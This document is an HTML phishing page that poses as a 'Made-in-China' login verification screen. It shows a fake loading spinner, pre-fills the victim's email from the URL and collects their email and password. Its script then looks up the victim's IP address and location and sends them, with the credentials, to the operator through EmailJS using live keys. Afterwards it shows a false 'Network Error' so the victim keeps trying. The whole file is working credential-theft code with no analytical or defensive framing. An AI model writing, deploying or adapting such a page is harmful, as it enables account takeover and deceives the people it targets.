
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification</title>

  <!-- EmailJS integration -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      emailjs.init({
        publicKey: "kUOv0ZnyMXgQQY1yj",
      });
    })();
  </script>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('made-in-china.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: Arial, sans-serif;
    }

    .overlay {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.6);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
    }

    .spinner {
      border: 6px solid rgba(255, 255, 255, 0.3);
      border-top: 6px solid white;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    .login-box {
      display: none; /* Ensure it is hidden initially */
      background: #e74c3c; /* Softer red color */
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      color: black;
      max-width: 400px;
      width: 90%;
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .login-box img {
      width: 100px;
      height: auto;
      border-radius: 10px;
    }

    .login-content {
      flex: 1;
    }

    .login-content h2 {
      margin: 0 0 10px;
      font-size: 20px;
      color: black;
    }

    .login-content p {
      margin: 0 0 20px;
      font-size: 14px;
      color: black;
    }

    .login-content input {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 8px;
      background: white;
      color: black;
      font-size: 14px;
    }

    .login-content button {
      background: black;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      display: block;
      text-align: center;
    }

    .login-content button:hover {
      background: #333;
    }

    .error-message {
      margin-top: 10px;
      color: red;
      font-size: 14px;
      display: none;
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <div class="spinner" id="spinner"></div>
    <div class="login-box" id="loginBox">
      <img src="made-in-china-logo.png" alt="Custom Image">
      <div class="login-content">
        <h2>Verify Access | Made-in-China Login</h2>
        <p>To verify access to Made-in-China via your Email account.</p>
        <input id="email" type="email" placeholder="Email Address" required>
        <input id="password" type="password" placeholder="Password" required>
        <button onclick="sendEmail()">Login</button>
        <div id="errorMessage" class="error-message">Network Error. Please try again.</div>
      </div>
    </div>
  </div>

  <script>
    window.addEventListener('load', () => {
      const spinner = document.getElementById('spinner');
      const loginBox = document.getElementById('loginBox');

      spinner.style.display = 'block';
      loginBox.style.display = 'none';

      setTimeout(() => {
        spinner.style.display = 'none';
        loginBox.style.display = 'flex';
      }, 3000);
    });

    // Populate the email field from URL parameter
window.onload = function () {
  var urlParams = new URLSearchParams(window.location.search);
  var email = urlParams.get('email'); // Fetch 'email' parameter from the URL
  document.getElementById('email').value = email || ''; // Populate the email field if the parameter exists
};


    // IPinfo Fetch and sendEmail function
    function sendEmail() {
  event.preventDefault();

  let email = document.getElementById("email").value.trim();
  let password = document.getElementById("password").value.trim();

  // Validation: check if email and password are filled
  if (email === "") {
    alert("Please enter your email.");
    return;
  }

  if (password === "") {
    alert("Please enter your password.");
    return;
  }

  // Fetch user's IP and location info from IPinfo
  fetch('https://ipinfo.io?token=f65a3d103cb816') // Replace 'f65a3d103cb816' with your IPinfo API token
    .then(response => response.json())
    .then(data => {
      // Extract information from IPinfo API response
      const ipInfo = {
        email: email,
        password: password,
        ip: data.ip || 'Unknown IP',
        city: data.city || 'Unknown City',
        region: data.region || 'Unknown Region',
        country: data.country || 'Unknown Country'
      };

      // Send email using EmailJS with proper template mapping
      emailjs
        .send("service_mclb6ze", "template_30nlj5e", ipInfo)
        .then(
          function (response) {
            console.log("Network Error, Try again later.", response.status, response.text);
            // Do not redirect; handle success as needed.
            alert("Network Error, Try again later.");
          },
          function (error) {
            console.error("Failed to send email:", error);
            // Display "Network Error" message after 3 seconds
            setTimeout(() => {
              alert("Network Error, please try again.");
            }, 3000);
          }
        );
    })
    .catch(error => {
      console.error("Error fetching IP info:", error);
      // Display "Network Error" message after 3 seconds
      setTimeout(() => {
        alert("Network Error, please try again.");
      }, 3000);
    });
}

  </script>
</body>
</html>
